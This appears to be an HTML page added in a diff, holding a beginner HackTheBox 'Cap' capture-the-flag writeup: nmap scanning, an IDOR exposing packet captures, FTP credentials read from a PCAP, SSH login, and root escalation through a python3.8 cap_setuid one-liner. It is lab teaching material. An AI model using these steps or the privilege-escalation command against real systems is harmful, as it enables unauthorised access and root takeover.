@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cap — ruiz00 Writeup</title>
+
+  <meta name="description" content="Detailed HackTheBox Cap writeup — IDOR, PCAP analysis, FTP credentials, Linux capabilities privilege escalation">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani&family=Orbitron&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="../../assets/css/main.css">
+  <link rel="stylesheet" href="../../assets/css/writeup.css">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/base16/monokai.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+</head>
+
+<body>
+<div class="scanlines"></div>
+<canvas id="matrix-canvas"></canvas>
+
+<nav class="nav">
+  <div class="nav-brand">
+    <a href="../../index.html">
+      <span class="nav-bracket">[</span>
+      <span class="nav-logo">ruiz00</span>
+      <span class="nav-bracket">]</span>
+    </a>
+  </div>
+  <div class="nav-links">
+    <a href="../../index.html#writeups" class="nav-link">← Back to Writeups</a>
+  </div>
+</nav>
+
+<main class="writeup-main">
+
+<header class="writeup-header">
+  <div class="writeup-meta-row">
+    <span class="card-badge htb">HTB</span>
+    <span class="card-diff easy">Easy</span>
+    <span class="writeup-os">🐧 Linux</span>
+    <span class="writeup-date">Sep 26, 2024</span>
+    <span class="writeup-solver">Bryan</span>
+  </div>
+
+  <h1 class="writeup-title">Cap</h1>
+
+  <p class="writeup-summary">
+    Full walkthrough of Cap covering <strong>IDOR exploitation</strong>, 
+    <strong>PCAP analysis</strong>, credential reuse, and 
+    <strong>Linux capability-based privilege escalation</strong>.
+  </p>
+
+  <div class="writeup-toc">
+    <div class="toc-header">// Table of Contents</div>
+    <ol>
+      <li><a href="#intro">Introduction</a></li>
+      <li><a href="#recon">Enumeration</a></li>
+      <li><a href="#web">Website Analysis</a></li>
+      <li><a href="#pcap">PCAP Analysis</a></li>
+      <li><a href="#foothold">Foothold</a></li>
+      <li><a href="#privesc">Privilege Escalation</a></li>
+    </ol>
+  </div>
+</header>
+
+<article class="writeup-content">
+
+<section id="intro">
+<h2>01 — Introduction</h2>
+
+<p>
+Cap is an easy Linux machine that is perfect for beginners.
+It introduces two important concepts:
+</p>
+
+<ul>
+<li>IDOR (Broken Access Control)</li>
+<li>Linux Capabilities (Privilege Escalation)</li>
+</ul>
+
+<div class="callout info">
+  <span class="callout-icon">ℹ</span>
+  <div>
+    This is an excellent first box for learning real-world attack chains.
+  </div>
+</div>
+
+<p>The target IP is:</p>
+
+<div class="code-block"><pre><code>10.10.10.245</code></pre></div>
+
+</section>
+
+<section id="recon">
+<h2>02 — Enumeration</h2>
+
+<p>
+We start with two Nmap scans:
+</p>
+
+<div class="code-block">
+<pre><code>nmap -p- -T4 10.10.10.245</code></pre>
+</div>
+
+<div class="code-block">
+<pre><code>nmap -p21,22,80 -A -T4 10.10.10.245</code></pre>
+</div>
+
+<p>
+This method is faster than running a full aggressive scan immediately.
+</p>
+
+<div class="code-block output">
+<pre><code>21 → FTP
+22 → SSH
+80 → HTTP (Gunicorn)</code></pre>
+</div>
+
+<div class="callout info">
+<div>
+Gunicorn is a Python WSGI server ("Green Unicorn") used to serve web applications.
+</div>
+</div>
+
+</section>
+
+<section id="web">
+<h2>03 — Website Analysis</h2>
+
+<p>
+The website is a security dashboard showing network captures.
+</p>
+
+<p>
+While browsing, we find downloadable PCAP files:
+</p>
+
+<div class="code-block"><pre><code>/data/1</code></pre></div>
+
+<p>
+Changing the ID:
+</p>
+
+<div class="code-block"><pre><code>/data/0</code></pre></div>
+
+<div class="callout warning">
+<div>
+This is an <strong>IDOR vulnerability</strong> (Insecure Direct Object Reference).
+</div>
+</div>
+
+<p>
+IDOR allows access to unauthorized data by modifying identifiers.
+</p>
+
+</section>
+
+<section id="pcap">
+<h2>04 — PCAP Analysis</h2>
+
+<p>
+A PCAP (Packet Capture) file contains network traffic.
+</p>
+
+<p>
+Using Wireshark, we inspect the capture and find:
+</p>
+
+<div class="code-block">
+<pre><code>Username: nathan
+Password: Buck3tH4TF0RM3!</code></pre>
+</div>
+
+<div class="callout info">
+<div>
+FTP sends credentials in plaintext → easily captured.
+</div>
+</div>
+
+</section>
+
+<section id="foothold">
+<h2>05 — Foothold</h2>
+
+<p>
+Using credentials:
+</p>
+
+<div class="code-block"><pre><code>ftp 10.10.10.245</code></pre></div>
+
+<div class="code-block"><pre><code>ssh nathan@10.10.10.245</code></pre></div>
+
+<p>
+We gain access and retrieve user flag.
+</p>
+
+<div class="code-block"><pre><code>cat user.txt</code></pre></div>
+
+</section>
+
+<section id="privesc">
+<h2>06 — Privilege Escalation</h2>
+
+<p>
+Check capabilities:
+</p>
+
+<div class="code-block">
+<pre><code>getcap -r / 2>/dev/null</code></pre>
+</div>
+
+<div class="code-block output">
+<pre><code>/usr/bin/python3.8 = cap_setuid</code></pre>
+</div>
+
+<p>
+Capabilities are granular permissions similar to SUID.
+</p>
+
+<div class="callout danger">
+<div>
+cap_setuid allows changing user ID → root escalation.
+</div>
+</div>
+
+<p>Exploit:</p>
+
+<div class="code-block">
+<pre><code>python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
+</div>
+
+<p>Root access achieved.</p>
+
+<div class="code-block">
+<pre><code>cat /root/root.txt</code></pre>
+</div>
+
+</section>
+
+<section>
+<h2>07 — Conclusion</h2>
+
+<p>
+This machine demonstrates a full attack chain:
+</p>
+
+<ul>
+<li>IDOR → Data Exposure</li>
+<li>PCAP → Credentials</li>
+<li>SSH → Foothold</li>
+<li>Capabilities → Root</li>
+</ul>
+
+<div class="callout success">
+<div>
+Great beginner-friendly machine with real-world concepts.
+</div>
+</div>
+
+</section>
+
+</article>
+<div class="writeup-nav">
+        <span class="writeup-nav-btn prev" style="opacity:0.3;cursor:default;">← No previous</span>
+        <a href="../../index.html#writeups" class="writeup-nav-btn all">All Writeups</a>
+        <span class="writeup-nav-btn next" style="opacity:0.3;cursor:default;">No next →</span>
+      </div>
+
+</main>
+
+<script src="../../assets/js/matrix.js"></script>
+  <script>
+    hljs.highlightAll();
+    function copyCode(btn) {
+      const code = btn.closest('.code-block').querySelector('code').textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        btn.textContent = 'copied!';
+        setTimeout(() => btn.textContent = 'copy', 2000);
+      });
+    }
+  </script>
+</body>
+</html>
